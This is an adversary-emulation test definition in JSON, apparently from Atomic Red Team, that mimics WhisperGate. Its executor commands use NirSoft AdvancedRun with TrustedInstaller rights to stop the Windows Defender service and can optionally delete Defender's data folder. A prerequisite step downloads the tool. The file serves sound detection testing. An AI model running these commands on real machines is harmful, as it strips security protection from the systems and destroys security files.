@@ -1,0 +1,43 @@
+{
+    "name": "Disable Defender Using NirSoft AdvancedRun",
+    "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign. See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3 Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk.  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
+        "cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "81ce22fd-9612-4154-918e-8a1f285d214d",
+    "arguments": {
+        "AdvancedRun_Location": {
+            "description": "Path of Advanced Run executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
+        },
+        "delete_defender_folder": {
+            "description": "Set to 1 to also delete the Windows Defender folder",
+            "type": "integer",
+            "default": 0
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
+            "prereq_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
